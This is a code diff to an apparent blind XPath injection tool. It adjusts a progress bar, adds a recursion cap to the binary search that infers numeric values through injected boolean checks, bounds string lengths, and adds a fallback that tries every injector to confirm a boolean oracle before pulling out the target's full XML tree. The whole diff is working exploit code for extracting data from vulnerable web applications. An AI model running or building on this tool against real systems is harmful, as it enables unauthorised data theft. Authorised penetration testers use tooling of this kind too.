@@ -422,12 +422,11 @@ def _similarity(a: str, b: str) -> float:
 
 def _progress(label: str, done: int, total: int, partial: str):
     """Live progress bar on stderr — keeps stdout clean for XML output."""
-    bar_w  = 24
+    bar_w  = 28
     filled = int(bar_w * done / total) if total else 0
     bar    = "█" * filled + "░" * (bar_w - filled)
     line   = (
-        f"\r  {T.GRAY}{label:<22}{T.RESET} "
-        f"[{T.CYAN}{bar}{T.RESET}] {done}/{total}  "
+        f"\r [{T.CYAN}{bar}{T.RESET}] {done}/{total}  "
         f"{T.GREEN}{partial}{T.RESET}"
     )
     print(line, end="", flush=True, file=sys.stderr)
@@ -600,10 +599,13 @@ async def detect_features(engine: Engine) -> Dict[str, bool]:
 # Binary search
 # ══════════════════════════════════════════════════════════════════════════════
 
-async def binary_search(engine: Engine, expr: str, lo: int = 0, hi: int = 50) -> int:
+async def binary_search(engine: Engine, expr: str, lo: int = 0, hi: int = 50,
+                        _depth: int = 0) -> int:
     """Find the integer value of a numeric XPath expression."""
+    if _depth > 12:          # prevent infinite recursion if oracle is broken
+        return -1
     if await engine.check(f"({expr}) > {hi}"):
-        return await binary_search(engine, expr, lo, hi * 2)
+        return await binary_search(engine, expr, lo, hi * 2, _depth + 1)
     while lo <= hi:
         mid = (lo + hi) // 2
         if await engine.check(f"({expr}) < {mid}"):
@@ -675,7 +677,7 @@ async def get_string(engine: Engine, expr: str,
     work = f"normalize-space({expr})" if ctx.has("normalize-space") else expr
 
     total = await binary_search(engine, f"string-length({work})", lo=0, hi=50)
-    if total <= 0:
+    if total <= 0 or total > 4096:   # -1 means not found, >4096 is bogus
         return ""
 
     # Try cached common strings first (avoids char-by-char for known values)
@@ -712,7 +714,8 @@ async def get_string(engine: Engine, expr: str,
 
 
 async def get_count(engine: Engine, expr: str) -> int:
-    return await binary_search(engine, f"count({expr})", lo=0)
+    result = await binary_search(engine, f"count({expr})", lo=0)
+    return max(0, result)  # binary_search returns -1 on failure
 
 
 # ══════════════════════════════════════════════════════════════════════════════
@@ -1162,12 +1165,26 @@ async def cmd_run(args: argparse.Namespace):
         method, inj, extra = result
         threshold = extra if method == ExtractionMethod.TIME else 0.0
 
-        # If Normal mode leaked something, show it and then also do boolean BFS
+        # If Normal mode leaked something, show it then switch to boolean BFS
         if method == ExtractionMethod.NORMAL and extra:
             ok("Normal extraction result:")
             print(_c(extra, T.GREEN))
             print()
             info("Switching to boolean mode for full XML tree extraction...")
+            # Re-verify that boolean oracle works with this injector,
+            # otherwise try all injectors for boolean on the same param
+            baseline2 = await _build_baseline(engine)
+            bool_ok = await _test_boolean(engine, ctx.target_param, inj, baseline2)
+            if not bool_ok:
+                # Find a working boolean injector
+                for candidate in INJECTORS:
+                    if await _test_boolean(engine, ctx.target_param, candidate, baseline2):
+                        ctx.injector = candidate
+                        inj = candidate
+                        ok(f"Boolean injector: {_c(inj.name, T.YELLOW)}")
+                        break
+                else:
+                    warn("No boolean injector confirmed — extraction may be unreliable")
             method    = ExtractionMethod.BOOLEAN
             threshold = 0.0
 
